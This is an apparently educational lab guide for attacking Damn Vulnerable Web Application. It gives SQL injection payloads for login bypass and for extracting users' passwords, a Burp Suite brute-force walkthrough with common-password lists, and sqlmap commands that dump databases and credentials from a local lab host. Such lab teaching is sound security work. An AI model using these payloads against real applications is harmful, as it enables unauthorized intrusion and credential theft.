# DVWA - Damn Vulnerable Web Application <!-- omit in toc -->

## Index <!-- omit in toc -->
- [Introduction](#introduction)
- [Setup](#setup)
- [DVWA Security](#dvwa-security)
- [1. Test SQL injection to bypass authentication](#1-test-sql-injection-to-bypass-authentication)
- [2. Use Bursuite to brute force](#2-use-bursuite-to-brute-force)
- [3. SQL injection](#3-sql-injection)
- [4. Blind SQL injection with SQLmap](#4-blind-sql-injection-with-sqlmap)
  - [Lists databases](#lists-databases)
  - [Lists the tables on a specific database](#lists-the-tables-on-a-specific-database)
  - [Lists all users](#lists-all-users)
  - [Users and passwords](#users-and-passwords)
  - [Get tables structure](#get-tables-structure)
  - [Dump database information](#dump-database-information)

## Introduction
This document aims to demonstrate a set of Web application security laboratories, based on a set of vulnerability analysis tools and on some PHP exploitation techniques. 

For these laboratories will be used an application purposely vulnerable as a way of demonstrating some of the techniques applied. This application is called Damn Vulnerable Web Application (DVWA). The DVWA is a Web application developed in PHP with a MySQL database, which is purposely insecure.

![](assets/picture01.png) 

To run these labs the following requirements are needed:
- [Kali Linux](https://www.kali.org/) (the version used was 2.0), in particular the following tools (although others can also be used):
- [Nikto](https://cirt.net/Nikto2)
- [W3af](https://w3af.org/)
- [Skipfish](https://code.google.com/archive/p/skipfish/)
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [OWASP](https://owasp.org/)
- [Metasploit](https://www.metasploit.com/)
- [sqlmap](https://sqlmap.org/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Apache Web Server](https://httpd.apache.org/)
- [Database server MySQL](https://www.mysql.com/).


The goal of these laboratories is even to demonstrate how a Web application can be exploited, and some of these attacks only result in an insecure application, with few security concerns, either in terms of development or configuration.

It is important to emphasize that it is not recommended to apply some of these techniques in real Web applications (spread across the Web), and students should apply them only to laboratories developed for this purpose.

## Setup
After installing and configuring the Apache web server and MySQL database server, it is necessary to install [DVWA](https://github.com/digininja/DVWA). Installation is simple, just unzip the ZIP file containing the application and copy them to the appropriate directory on the Apache Web server. If you choose, you can also use a Linux distribution called [Metasploitable 2](https://sourceforge.net/projects/metasploitable/) , where DVWA (along with other applications) is already installed.

When invoked for the first time it is necessary to install the DVWA database, in MySQL. It may be necessary to edit the `config.inc.php` file which will be in the "`config`" folder and configure the username and password to access the MySQL database server.
Default username and password in DVWA are as follows:

- Login: admin
- Password: password

## DVWA Security
Colocar o modo de segurança (DVWA Security) da aplicação Web - DVWA - em modo “low”. Isto é feito apenas por uma questão de simplicidade dos próprios ataques que podem ser realizados contra a aplicação. Quanto mais elevado o nível de segurança, mais complexos se tornarão os ataques a realizar.


## 1. Test SQL injection to bypass authentication

    username = admin'#
    pass = <blank>

## 2. Use Bursuite to brute force

2.1. Capture the request

2.2. Send to intruder

2.3. Select the Cluster Bomb

2.4. Set payloads

2.5. Start attack

List of usernames to Use

    user
    carlos
    admin
    superadmin

List of passwords to Use (top passwords od 2022)

    123456
    123456789
    qwerty
    password
    12345
    qwerty123
    1q2w3e
    12345678
    111111
    1234567890

## 3. SQL injection

    a' OR ''='

    ' union select 1,@@version#

    ' union select null,schema_name from information_schema.schemata #

    ' union select null,concat(first_name,0x0a,password) from users #

## 4. Blind SQL injection with SQLmap

### Lists databases

    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –dbs

### Lists the tables on a specific database

    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --tables

### Lists all users

    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" –users

### Users and passwords

    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" --users --passwords

### Get tables structure

    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --columns

### Dump database information

    sqlmap -u "http://192.168.8.142/dvwa/vulnerabilities/sqli_blind/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=84c13kemobb8ti32mqttte7497" -D dvwa --dump